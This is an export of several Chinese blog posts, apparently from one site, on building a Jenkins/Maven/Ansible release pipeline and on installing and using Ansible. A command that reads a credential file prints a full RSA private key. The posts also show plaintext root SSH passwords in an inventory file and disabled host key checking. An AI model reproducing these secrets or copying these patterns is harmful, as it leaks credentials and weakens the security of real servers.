2.在jenkins上点击添加私钥3.选择SSH…key，输入用户名，输入私钥，输入密码，添加完成。在Jenkins发布服务器上面查看私钥： 1234567891011121314151617181920212223242526[root@ansible_02 yaml]# cat /root/.ssh/id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAv5BSNmykQcvklQdb+3jV8d1I2tjq4tIiyVbQDhDBs6UFR4hj20EHg/3Tjvw+4mHtzWFYv1/rYeTg7xJ/bIf3XRIeRcrc/b2rvqo3wQBupRjHM6wbnd+Jgyv2v8Lk2c8yNzMoUIuYzcG5Dpv5mWyg1akbWcIH3tsGyTVXxxmAQ78L+J1Nzj3a9fImQcx5ocKlV/Y1v9B+Uv4gTBmSBR7akvNg7E+3JKTphbbUv3rFrG6zqvTWCtEA/h9X//zPWTiwTjJv87NJkHQLqoo1TPYZcNjDEfki+jfc9gJzJvZ/5D0A3fA/mO8ApW9VMsaLiiwQvGP2RoiTVwU2G1iNASBcWwIDAQABAoIBABh64fawhYEfBDQDP77wHy8MXz4QUFvyDJ38KRRTEd3aLcWJaXFgawx0CHASThrx9sizMvspz9OvwwrqKzx8V6EeKp4yoXEPpv3zlLJmUr1oYDR7PwA6y8Dmgl7ZEhO/haRGNlWssTdCFVsHlasElb0YIjWjNQxGoyRdW71GxfxiGdZXgWDT7yYGvdavO5tGzDPhh6/vf5lpU2F2nJbMyXzWgrrqXqIG3W+jqg2kVAfiMdNgeUOn6+SA/7uK8rNhxG/5dr7WKJE31uRSFJiVCATcHQBIRScDDd/nI8rGiVQOjHFt2oNV82DOIhNXhbzdWGROUcMiT04OoJgQJeNL7IkCgYEA8wrgamw1w5dBoynzV6tUPgSdHhAMoMhPrzJTaG8qMamnHzZgz1fl3jqI7qCNsj1n6Y1UbzhKILHcTIoUj7lj41mY4XVBHqDLXh9Socf9IPrSabZIfe2nwMLMhdhoaMPUWtHj9SUn/Y+ESLuFLtF6LjR1Eghu8xKRwULo1GscSyUCgYEAycbYj1/KaFAcwSl7teRiYEY+LRHB/AUa7lc+r+p2YMjGQ3CiaN9wKqu1E4jEvL0eZXDKaXJ6qcDJiHa2M+Bf8qcVoyXtKFtlTfSVPJDviZjl3EPmhXbuKzW3et2w5zWv8lAU2fWU+3ta3fVrFXz2zlY1j47Dv9zUlDeCF+lRMX8CgYEA1hkKwDU612XzSEy4NM6Uk111GvqAZVKP/4GRwDnNLZqJwhEhDwYbVLyzy6JbsFwvoaoCa0dm5Y5IxpQMsN9bZ9GGH7CWLEJ7a4gJmrYQYpECgYAIqe8WiOhp/jad3KghMUNAGwQEb2TC630yirB4YTrgAP7yWl2+3wkz69eElTTNXdl2RZeLW40EyPBeWaqNI686/g2hybkbKIF7DWtzBE4kvFnyUUAOrwKe/Fl6fxZfdyCs6N9cVH0nJy7JpQYKECmQxobaOSkSjerayl9dx1mI3d6fwqmAbbyiolLXbn3JySkxTaVBS8gjnQh6LO6JbpTspKlz3R2/CzUhDhEYn3vhU2trAGh6hY/bizI1oKNxwp/b9uAaLVmmHGNV/+V5glnDH+luQA==-----END RSA PRIVATE KEY----- 此处要注意，将默认的master分支改为我们之前定义好的分支变量. 1.5项目打包由于我们使用手动出发构建，触发器我们此处不需要配置。构建环境暂时也不需要配置，这里调用ansible去执行yml代码发布。项目打包优化了。 关键在于构建的步骤。我们可以使用Shell命令，进入项目目录，使用Maven命令进行打包。 这里主要是if 判断是 执行对应模块打包。这样节省了打包时间，如果不做对应发布模块发布，第一条如何model等于all 文件：全部执行 : mvn clean install -U -T 1C -Dmaven.test.skip=true 如果不等于这里指定对应模块打包： mvn clean install -pl $model -amd -U -T 1C -Dmaven.test.skip=true 123456echo $modelif [[ $model == all* ]]; thencd /srv/ &amp;&amp; rm dev-properties/ -rf &amp;&amp; git clone git@gitlab.ihaozhuo.com:dev-properties/dev-properties.git &amp;&amp; cd /root/.jenkins/workspace/yjk-dev_master/haozhuo/ &amp;&amp; mvn clean install -U -T 1C -Dmaven.test.skip=true -Dmaven.compile.fork=true -Pdev -Dautoconfig.userProperties=/srv/dev-properties/dev1.properties -Dautoconfig.charset=utf-8elsecd /srv/ &amp;&amp; rm dev-properties/ -rf &amp;&amp; git clone git@gitlab.ihaozhuo.com:dev-properties/dev-properties.git &amp;&amp; cd /root/.jenkins/workspace/yjk-dev_master/haozhuo/ &amp;&amp; mvn clean install -pl $model -amd -U -T 1C -Dmaven.test.skip=true -Dmaven.compile.fork=true -Pdev -Dautoconfig.userProperties=/srv/dev-properties/dev1.properties -Dautoconfig.charset=utf-8fi 所有的脚本和变量的参数列表统一。 这里说下发布模块 结合ansible-Playbook基本语法写控制发布服务器，然后在jenkins上面写ansible 发布脚本&amp;命令。model.sh 脚本： 12345678910111213#!/bin/sh IFS=',' arr=$1 for split in $arr do echo $split /usr/bin/ansible-playbook /srv/yaml/$split.yml if [ $split = 'all' ] then echo \"model:all\" break fi done 这里举个例子我上面发布yml模块代码。 这个脚本做了五件事：1) 首先指定编码为UTF-8（否则启动项目后会乱码！这是个坑!）2) 拷贝文件到指定机器的目录下，拷贝命令的dest不能使用变量！否则拷贝不会成功！（第二个坑）3) 重启远程服务，我们试过直接重启tomcat服务，虽然服务重启会成功，但是最后会报一个错误，导致项目编码无法指定为UTF-8，所以我们还是选择使用Shell脚本去重启服务（第三个坑）。4） 进行创建目录备份。5） 查看进程后台启动。 Ansible脚本编写完之后，可以现在自己本机上执行一下。目标机器上必须安装libselinux-python，不然无法执行成功（小坑）。 在jenkins中我们做如下配置：在构建打包命令后面我们增加一个Shell命令，用来执行Ansible的脚本。我们脚本名称使用变量名称，这样我们选择模块就能执行对应的脚本。 1.6发送邮件配置好构建失败后发送邮件到指定的邮箱，多个邮箱用逗号隔开。 至此项目配置结束。 六.运行效果，打包效果。指定模块去打包，终端上查看发布日志 这里变量生效效果： 七. Jenkins延伸学习效果图： Blue Ocean 是Jenkins 非常不错一个提升。 这里可以查看下我在我github上面扩展更新jenkins新功能Blue Ocean实现先进的可视化精确定位问题 现在我们Git使用的是 GitLab，同时为了安全我们做了一层LDAP代理，效果相当于“将军令”，操作机、Git和Jenkins用 OpenLDAP 做统一认证，后续用到的Redmine、Grafana、Zabbix 等都接入了OpenLDAP认证，每个人都有个动态口令，每次验证都需要用到。","link":"/2016/09/12/自动化+Jenkins/Jenkins/用Ansible + Jenkins+maven＋nginx搞定自动发布，构建程序的持续集成平台/"},{"title":"Ansible小结（三）ansible.cfg与默认配置","text":"#Ansible小结（四）ansible.cfg与默认配置 Ansible默认安装好后有一个配置文件/etc/ansible/ansible.cfg，该配置文件中定义了ansible的主机的默认配置部分，如默认是否需要输入密码、是否开启sudo认证、action_plugins插件的位置、hosts主机组的位置、是否开启log功能、默认端口、key文件位置等等。 具体如下： 123456789101112131415161718192021222324252627282930313233[defaults]# some basic default values...hostfile = /etc/ansible/hosts \\\\指定默认hosts配置的位置# library_path = /usr/share/my_modules/remote_tmp = $HOME/.ansible/tmppattern = *forks = 5poll_interval = 15sudo_user = root \\\\远程sudo用户#ask_sudo_pass = True \\\\每次执行ansible命令是否询问ssh密码#ask_pass = True \\\\每次执行ansible命令时是否询问sudo密码transport = smartremote_port = 22module_lang = Cgathering = implicithost_key_checking = False \\\\关闭第一次使用ansible连接客户端是输入命令提示log_path = /var/log/ansible.log \\\\需要时可以自行添加。chown -R root:root ansible.logsystem_warnings = False \\\\关闭运行ansible时系统的提示信息，一般为提示升级# set plugin path directories here, separate with colonsaction_plugins = /usr/share/ansible_plugins/action_pluginscallback_plugins = /usr/share/ansible_plugins/callback_pluginsconnection_plugins = /usr/share/ansible_plugins/connection_pluginslookup_plugins = /usr/share/ansible_plugins/lookup_pluginsvars_plugins = /usr/share/ansible_plugins/vars_pluginsfilter_plugins = /usr/share/ansible_plugins/filter_pluginsfact_caching = memory[accelerate]accelerate_port = 5099accelerate_timeout = 30accelerate_connect_timeout = 5.0# The daemon timeout is measured in minutes. This time is measured# from the last activity to the accelerate daemon.accelerate_daemon_timeout = 30 在ansible.cfg配置文件中，也会找到如下部分： 12# uncomment this to disable SSH key host checkinghost_key_checking = False 默认host_key_checking部分是注释的，通过找开该行的注释，同样也可以实现跳过 ssh 首次连接提示验证部分。 我这里做了免秘钥的查看日志如下： 12345678910111213141516171819[root@docker ~]# ansible tomcat_C1 -a \"uptime\"192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:03 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.00[root@docker ~]#[root@docker ~]#[root@docker ~]# cat /var/log/ansible.log2016-09-05 09:19:23,235 p=1412 u=root | ERROR! Missing target hosts2016-09-05 09:19:54,580 p=1417 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:20:24 up 24 days, 15:31, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:20:07,206 p=1440 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:20:37 up 24 days, 15:31, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:27:31,607 p=1460 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:01 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:27:33,800 p=1482 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:03 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.00 更多部分可以参看官方文档","link":"/2016/03/07/自动化+Jenkins/Ansible/Ansible小结（三）ansible.cfg与默认配置 /"},{"title":"Ansible 小结（一）ansible的安装","text":"上一篇文章记录了解ansible,这篇大概记录下常规使用命令。 这里以CentOS Linux release 7.2.1511 (Core)系统为准。 一、Ansible的安装Centos安装1、yum源安装 以centos为例，默认在源里没有ansible，不过在fedora epel源里有ansible，配置完epel 源后，可以直接通过yum 进行安装。这里以centos6.8为例： 123456centos 6# yum install http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpmcentos 7# yum install http://mirrors.sohu.com/fedora-epel/7/x86_64/Packages/e/epel-release-7-11.noarch.rpm# yum install -y ansible Ubuntu安装2、apt-get安装 在ubuntu及其衍生版中，可以通过增加ppa源进行apt-get安装，具体如下： 1234$ sudo apt-get install software-properties-common$ sudo apt-add-repository ppa:ansible/ansible$ sudo apt-get update$ sudo apt-get install ansible 3、源码安装 源码安装需要python2.6以上版本，其依赖模块paramiko、PyYAML、Jinja2、httplib2、simplejson、pycrypto模块，以上模块可以通过pip或easy_install 进行安装，不过本部分既然提到的是源码安装，主要针对的无法上外网的情况下，可以通过pypi 站点搜索以上包，下载后通过python setup.py install 进行安装。 最后通过github或pypi上下载ansible源码包，通过python setup.py install 安装即可。由于安装过程相对简单，这里略过，主要介绍安装后，可能遇到的问题。 a、安装PyYAML时，报错如下： 123456789# python setup.py installlibyaml is not found or a compiler error: forcing --without-libyaml(if libyaml is installed correctly, you may need to specify the option --include-dirs or uncomment and modify the parameter include_dirs in setup.cfg)running install_librunning install_egg_infoRemoving /usr/lib64/python2.6/site-packages/PyYAML-3.11-py2.6.egg-infoWriting /usr/lib64/python2.6/site-packages/PyYAML-3.11-py2.6.egg-info 在centos6.8系统中，可以通过yum -y install libyaml包解决，或者从ISO文件中提供该包，通过rpm -ivh进行安装。 ###二、Ansible的配置与验证 yum 安装使用默认示例配置文件后，编辑/etc/ansible/hosts文件，通过以下方式验证ansible是否可用： 12345[root@docker ~]# cat /etc/ansible/hosts[test]10.212.52.252 ansible_ssh_user=root ansible_ssh_pass=qwe123.com10.212.52.14 ansible_ssh_user=root ansible_ssh_pass=abc12310.212.52.16 ansible_ssh_user=root ansible_ssh_pass=91it.org 以上的配置中，我配置了一个test组，该组下有三台主机，三台都使用root验证，三台的密码分别是361way.com、abc123、91it.org 。 注：后面的用户和密码项是非必须的，在配置key认证的情况下，不使用密码也可以直接操作 。未使用key的，也可以在ansible通过 -k参数在操作前询问手动输入密码。 配置文件就是一般下目录的hosts文件。 在库存中，我们可以定义如下信息： 主机地址 主机分组 连接属性（登录名，密码，秘钥，端口等）1，主机地址和分组 定义主机地址和名称比较简单： 12[&lt;主机名&gt;]&lt;主机 IP&gt; 定义分组的语法类似，就是在名字后加上:children，成员可以是主机名，也可以是分组名： 123[&lt;分组名&gt;:children]&lt;主机名&gt;&lt;分组名&gt; 2，连接属性 可以针对SSH连接指定一些参数： ansible_ssh_host：主机名。 ansible_ssh_port：SSH端口，默认22。 ansible_ssh_user：登录用户。 ansible_ssh_pass：登陆密码。 ansible_ssh_private_key_file：私钥。 通过私钥登陆的话，就不要指定登录密码了，主机名也可以忽略。当然，既然是使用私钥登陆，需要你确保已经在各个中主机的authorized_keys里添加了对应的公钥。 3，演示 完整的库存例子如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# -----------------# 首先定义各个主机# -----------------#============================01_version=============================#[tomcat-account_01] 10.27.232.82[tomcat-point_01] 10.27.2.12[tomcat-system_01] 10.27.232.12 [tomcat-family_01] 10.27.230.63 [tomcat-mission_01] 10.47.59.12 [tomcat-card_01] 10.47.74.12 [tomcat-check_01] 10.47.107.153 # -----------------# 定义分组## 在这里我们定义了三个分组，分别名为：# - cluster1# - light# - starwar# -----------------[cluster1:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01[light:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01[starwar:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01# -----------------# 给分组定义变量## 这里我们给 starwar 组定义了变量 # -----------------[cluster1:vars]ansible_ssh_port=7525ansible_ssh_user=lucasansible_ssh_private_key_file=./ssh/id_rsa 这里设置分组的时候名字不能与单台机器名称一样。比如： 1234[tomcat-account_01] 10.27.232.82[tomcat-account_01:children]tomcat-account_01 这里例子是错误的，会提示分组存在。 为了安全和方便在hosts里面就不需要写用户名和密码。做个免秘钥登陆。这里我自己对控制的机器全部做了免秘钥登陆，所以这里只需要这么写： 1234567891011121314151617[redis1]192.168.1.173[redis2]192.168.1.174[tomcat_A1]192.168.1.175[tomcat_B1]192.168.1.176[tomcat_C1]192.168.1.177[tomcat_D1]192.168.1.178 这里是执行脚本。 1ansible tomcat_D1 -m shell -a \"sh +x /root/update/shoppingmall.sh\" 例子操作查看zk1分组上所有机器端口： 123456789101112131415161718192021222324252627[root@salt ansible]# ansible zk1:children -m shell -a \"netstat -ntulp\"10.27.238.75 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:56521 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1251/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 12497/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1434/aegis_quartzudp 0 0 118.178.240.129:123 0.0.0.0:* 1262/ntpdudp 0 0 10.27.238.75:123 0.0.0.0:* 1262/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1262/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1262/ntpd10.47.100.200 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:58367 0.0.0.0:* LISTEN 11232/javatcp 0 0 10.47.100.200:10050 0.0.0.0:* LISTEN 646/zabbix_agentdtcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 11232/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1243/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 11232/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1436/aegis_quartzudp 0 0 120.27.152.77:123 0.0.0.0:* 1254/ntpdudp 0 0 10.47.100.200:123 0.0.0.0:* 1254/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1254/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1254/ntpd","link":"/2016/03/07/自动化+Jenkins/Ansible/Ansible 小结（一）ansible的安装 /"},{"title":"Ansible安装出现 ImportError/ No module named _text","text":"centos6.7 ansible yum安装出现问题：12345ansible --versionTraceback (most recent call last): File \"/usr/bin/ansible\", line 46, in &lt;module&gt; from ansible.module_utils._text import to_textImportError: No module named _text 提示这个错误，后面查看官网epel包需要更新，这里我已更新发现还是有问题。 解决方法：使用pip install安装过ansible就正常使用12345678910111213141516171819202122232425262728[root@ansible_01 ~]# pip install ansibleCollecting ansible Downloading ansible-1.9.4.tar.gz (937kB) 100% |████████████████████████████████| 937kB 100kB/s Collecting paramiko (from ansible) Downloading paramiko-1.15.3-py2.py3-none-any.whl (166kB) 100% |████████████████████████████████| 167kB 136kB/s Collecting jinja2 (from ansible) Downloading Jinja2-2.8-py2.py3-none-any.whl (263kB) 100% |████████████████████████████████| 266kB 1.4MB/s Collecting PyYAML (from ansible) Downloading PyYAML-3.11.tar.gz (248kB) 100% |████████████████████████████████| 249kB 72kB/s Requirement already satisfied (use --upgrade to upgrade): setuptools in /usr/local/python27/lib/python2.7/site-packages/setuptools-18.4-py2.7.egg (from ansible)Collecting pycrypto&gt;=2.6 (from ansible) Downloading pycrypto-2.6.1.tar.gz (446kB) 100% |████████████████████████████████| 446kB 117kB/s Collecting ecdsa&gt;=0.11 (from paramiko-&gt;ansible) Downloading ecdsa-0.13-py2.py3-none-any.whl (86kB) 100% |████████████████████████████████| 90kB 141kB/s Collecting MarkupSafe (from jinja2-&gt;ansible) Downloading MarkupSafe-0.23.tar.gzInstalling collected packages: ecdsa, pycrypto, paramiko, MarkupSafe, jinja2, PyYAML, ansible Running setup.py install for pycrypto Running setup.py install for MarkupSafe Running setup.py install for PyYAML Running setup.py install for ansibleSuccessfully installed MarkupSafe-0.23 PyYAML-3.11 ansible-1.9.4 ecdsa-0.13 jinja2-2.8 paramiko-1.15.3 pycrypto-2.6.1 如果提示没有No package &#39;libffi&#39; found 1yum install libffi-devel 如果可以正常显示不需要设置 如果还是有问题设置下依赖： 12345678910111213141516[root@ansible_01 ~]# find / -name ansible/etc/ansible/usr/local/bin/ansible/usr/local/src/ansible/usr/local/src/ansible/docsite/js/ansible/usr/local/src/ansible/bin/ansible/usr/local/src/ansible/packaging/port/sysutils/ansible/usr/local/src/ansible/packaging/macports/sysutils/ansible/usr/local/src/ansible/build/scripts-2.6/ansible/usr/local/src/ansible/build/lib/ansible/usr/local/src/ansible/lib/ansible/usr/local/src/ansible/.git/modules/lib/ansible/usr/local/lib/python2.7/site-packages/ansible/usr/lib/python2.6/site-packages/ansible-2.1.0-py2.6.egg/ansible/usr/lib/python2.6/site-packages/ansible-2.1.0-py2.6.egg/EGG-INFO/scripts/ansible/home/ansible 然后安装完成正常显示版本信息： 123456 ln -s /usr/local/bin/ansible /usr/bin/ansible [root@LAN_zabbix pip-9.0.1]# ansible --versionansible 2.2.1.0 config file = configured module search path = Default w/o overrides","link":"/2016/06/10/自动化+Jenkins/Ansible/Ansible 安装出现 ImportError: No module named _text/"},{"title":"Ansible小结（四）Ad-hoc与commands模块","text":"ansible小结（四）Ad-hoc与commands模块Ad-Hoc 是指ansible下临时执行的一条命令，并且不需要保存的命令，对于复杂的命令后面会说playbook。讲到Ad-hoc 就要提到模块，所有的命令执行都要依赖于事先写好的模块，默认安装好的ansible 里面已经自带了很多模块，如：command、raw、shell、file、cron等，具体可以通过ansible-doc -l 进行查看 。 1、Ad-hoc1、直接执行 这里还是先来一个上几篇幅经常用到的一个例子： 1234[root@docker ~]# ansible tomcat_C1 -a \"uptime\" -kSSH password:192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 10:37:10 up 24 days, 16:48, 4 users, load average: 0.00, 0.00, 0.00 一个ad-hoc命令的执行，需要按以下格式进行执行： 1ansible 主机或组 -m 模块名 -a '模块参数' ansible参数 主机和组，是在/etc/ansible/hosts 里进行指定的部分，当然动态Inventory 使用的是脚本从外部应用里获取的主机. 模块名，可以通过ansible-doc -l查看目前安装的模块，默认不指定时，使用的是command模块，具体可以查看/etc/ansible/ansible.cfg 的“#module_name = command ” 部分，默认模块可以在该配置文件中进行修改； 模块参数，可以通过 “ansible-doc 模块名” 查看具体的用法及后面的参数； ansible参数，可以通过ansible命令的帮忙信息里查看到，这里有很多参数可以供选择，如是否需要输入密码、是否sudo等。 2、后台执行例子当命令执行时间比较长时，也可以放到后台执行，这里会用到-B、-P参数，如下： 123ansible all -B 3600 -a \"/usr/bin/long_running_operation --do-stuff\" \\\\后台执行命令 3600s，-B 表示后台执行的时间ansible all -m async_status -a \"jid=123456789\" \\\\检查任务的状态ansible all -B 1800 -P 60 -a \"/usr/bin/long_running_operation --do-stuff\" \\\\后台执行命令最大时间是 1800s 即 30 分钟，-P 每 60s 检查下状态默认 15s 123[root@docker ~]# ansible -B 60 -P 1 tomcat_B1 -a \"uptime\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 11:23:00 up 24 days, 17:34, 1 user, load average: 0.00, 0.00, 0.00 二、commands模块上面已经提到，ansbile自身已经自带了很多模块，可以通过ansible-doc -l 进行查看。这里就结合command、shell、raw、script模块了解下其用法。 上面四个模块都属于commands 类。 command模块，该模块通过-a跟上要执行的命令可以直接执行，不过命令里如果有带有如下字符部分则执行不成功 “ so variables like $HOME and operations like “&lt;”, “&gt;”, “|”, and “&amp;” will not work (use the shell module if you need these features).”；** shell模块，用法其本和command一样，不过的是其是通过/bin/sh进行执行，所以shell 模块可以执行任何命令，就像在本机执行一样，“ It is almost exactly like the command module but runs the command through a shell (/bin/sh) on the remote node.”； raw模块，用法和shell 模块一样 ，其也可以执行任意命令，就像在本机执行一样，“Executes a low-down and dirty SSH command, not going through the module subsystem. There is no change handler support for this module. This module does not require python on the remote system” script模块，其是将管理端的shell 在被管理主机上执行，其原理是先将shell 复制到远程主机，再在远程主机上执行，原理类似于raw模块，“This module does not require python on the remote system, much like the raw module.” 。 注：raw模块和comand、shell 模块不同的是其没有chdir、creates、removes参数，chdir参数的作用就是先切到chdir指定的目录后，再执行后面的命令，这在后面很多模块里都会有该参数 。 ###command模块包含如下选项： creates：一个文件名，当该文件存在，则该命令不执行 free_form：要执行的linux指令 chdir：在执行指令之前，先切换到该指定的目录 removes：一个文件名，当该文件不存在，则该选项不执行 executable：切换shell来执行指令，该执行路径必须是一个绝对路径 command模块、raw模块、shell模块示例： command例子：123456789101112131415161718192021222324252627[root@docker ~]# ansible tomcat_B1 -m command -a \"ps -ef|grep tomcat\"192.168.1.176 | FAILED | rc=1 &gt;&gt;ERROR: Unsupported SysV option.********* simple selection ********* ********* selection by list *********-A all processes -C by command name-N negate selection -G by real group ID (supports names)-a all w/ tty except session leaders -U by real user ID (supports names)-d all except session leaders -g by session OR by effective group name-e all processes -p by process ID -q by process ID (unsorted &amp; quick)T all processes on this terminal -s processes in the sessions givena all w/ tty, including other users -t by ttyg OBSOLETE -- DO NOT USE -u by effective user ID (supports names)r only running processes U processes for specified usersx processes w/o controlling ttys t by tty*********** output format ********** *********** long options ***********-o,o user-defined -f full --Group --User --pid --cols --ppid-j,j job control s signal --group --user --sid --rows --info-O,O preloaded -o v virtual memory --cumulative --format --deselect-l,l long u user-oriented --sort --tty --forest --version-F extra full X registers --heading --no-heading --context --quick-pid ********* misc options *********-V,V show version L list format codes f ASCII art forest-m,m,-L,-T,H threads S children in sum -y change -l format-M,Z security data c true command name -c scheduling class-w,w wide output n numeric WCHAN,UID -H process hierarchy 上面的执行结果可以看到，我这里加了管道，command模块执行时出错，而使用raw模块和shell模块都正常。 shell例子：123[root@docker ~]# ansible tomcat_B1 -m shell -a \"ps -ef|grep tomcat\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;root 1529 1 0 Aug11 ? 00:00:00 jsvc.exec -java-home /srv/jdk1.7.0_67 -user tomcat -pidfile /srv/tomcat/tomcat_manager/logs/catalina-daemon.pid -wait 10 -outfile /srv/tomcat/tomcat_manager/logs/catalina-daemon.out -errfile &amp;1 -classpath /srv/tomcat/tomcat_manager/bin/bootstrap.jar:/srv/tomcat/ 使用chdir的示例：12345678[root@docker ~]# ansible tomcat_B1 -m command -a \"chdir=/tmp/ touch 1.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;[root@docker ~]# ansible tomcat_B1 -m shell -a \"chdir=/tmp/ touch 2.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;[root@docker ~]# ansible tomcat_B1 -m raw -a \"chdir=/tmp/ touch 3.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 从上面执行结果来看，三个命令都执行成功了。不过通过在远程主机上查看，前两个文件被成功创建： 12345[root@docker ~]# ansible tomcat_B1 -m command -a \"chdir=/tmp/ ls -lh\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;total 188K-rw-r--r--. 1 root root 0 Sep 5 22:52 1.txt-rw-r--r--. 1 root root 0 Sep 5 22:51 2.txt 使用raw模块的执行的结果文件也被正常创建了，不过不是在chdir 指定的目录，而是在当前执行用户的家目录。 123[root@docker ~]# ansible tomcat_B1 -m raw -a \"ls ~/4.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;/root/4.txt creates与removes示例：这里我在测试主机上创建/tmp/server.txt文件，执行结果如下： creates：一个文件名，当该文件存在，则该命令不执行 1234567[root@docker ~]# ansible tomcat_B1 -a \"creates=/tmp/1.txt uptime\" [WARNING]: Failure using method (v2_runner_on_ok) in callback plugin (&lt;ansible.plugins.callback.minimal.CallbackModule object at 0x2093e90&gt;): coercing toUnicode: need string or buffer, bool found[root@docker ~]# ansible tomcat_B1 -a \"removes=/tmp/1.txt uptime\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 22:59:04 up 25 days, 5:10, 1 user, load average: 0.00, 0.00, 0.00 script模块示例：1234567891011121314[root@361way ~]# cat script.sh#!/bin/bashdf -hlifconfigps auxf|grep snmp[root@361way ~]# ansible 10.212.52.252 -m script -a 'scrip.sh'10.212.52.252 | FAILED =&gt; file or module does not exist: /root/scrip.sh[root@361way ~]# ansible 10.212.52.252 -m script -a 'script.sh'10.212.52.252 | success &gt;&gt; &#123; \"changed\": true, \"rc\": 0, \"stderr\": \"OpenSSH_5.3p1, OpenSSL 1.0.1e-fips 11 Feb 2013\\ndebug1: Reading configuration data /etc/ssh/ssh_config\\r\\ndebug1: Applying options for *\\r\\ndebug1: auto-mux: Trying existing master\\r\\nControl socket connect(/root/.ansible/cp/ansible-ssh-10.212.52.252-22-root): Connection refused\\r\\ndebug1: Connecting to 10.212.52.252 [10.212.52.252] port 22.\\r\\ndebug1: fd 3 clearing O_NONBLOCK\\r\\ndebug1: Connection established.\\r\\ndebug1: permanently_set_uid: 0/0\\r\\ndebug1: identity file /root/.ssh/identity type -1\\r\\ndebug1: identity file /root/.ssh/identity-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_rsa type -1\\r\\ndebug1: identity file /root/.ssh/id_rsa-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_dsa type -1\\r\\ndebug1: identity file /root/.ssh/id_dsa-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_ecdsa type -1\\r\\ndebug1: identity file /root/.ssh/id_ecdsa-cert type -1\\r\\ndebug1: Remote protocol version 2.0, remote software version OpenSSH_6.2\\r\\ndebug1: match: OpenSSH_6.2 pat OpenSSH*\\r\\ndebug1: Enabling compatibility mode for protocol 2.0\\r\\ndebug1: Local version string SSH-2.0-OpenSSH_5.3\\r\\ndebug1: SSH2_MSG_KEXINIT sent\\r\\ndebug1: SSH2_MSG_KEXINIT received\\r\\ndebug1: kex: server-&gt;client aes128-ctr hmac-md5 zlib@openssh.com\\r\\ndebug1: kex: client-&gt;server aes128-ctr hmac-md5 zlib@openssh.com\\r\\ndebug1: SSH2_MSG_KEX_DH_GEX_REQUEST(1024&lt;1024&lt;8192) sent\\r\\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP\\r\\ndebug1: SSH2_MSG_KEX_DH_GEX_INIT sent\\r\\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY\\r\\ndebug1: Host '10.212.52.252' is known and matches the RSA host key.\\r\\ndebug1: Found key in /root/.ssh/known_hosts:1\\r\\ndebug1: ssh_rsa_verify: signature correct\\r\\ndebug1: SSH2_MSG_NEWKEYS sent\\r\\ndebug1: expecting SSH2_MSG_NEWKEYS\\r\\ndebug1: SSH2_MSG_NEWKEYS received\\r\\ndebug1: SSH2_MSG_SERVICE_REQUEST sent\\r\\ndebug1: SSH2_MSG_SERVICE_ACCEPT received\\r\\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\\r\\ndebug1: Next authentication method: keyboard-interactive\\r\\ndebug1: Enabling compression at level 6.\\r\\ndebug1: Authentication succeeded (keyboard-interactive).\\r\\ndebug1: setting up multiplex master socket\\r\\nControlSocket /root/.ansible/cp/ansible-ssh-10.212.52.252-22-root already exists, disabling multiplexing\\r\\ndebug1: channel 0: new [client-session]\\r\\ndebug1: Requesting no-more-sessions@openssh.com\\r\\ndebug1: Entering interactive session.\\r\\ndebug1: Sending environment.\\r\\ndebug1: Sending env LANG = en_US.UTF-8\\r\\ndebug1: Sending command: LANG=C LC_CTYPE=C /root/.ansible/tmp/ansible-tmp-1431924855.88-242473611260231/script.sh \\r\\ndebug1: client_input_channel_req: channel 0 rtype exit-status reply 0\\r\\ndebug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0\\r\\ndebug1: channel 0: free: client-session, nchannels 1\\r\\ndebug1: fd 1 clearing O_NONBLOCK\\r\\ndebug1: fd 2 clearing 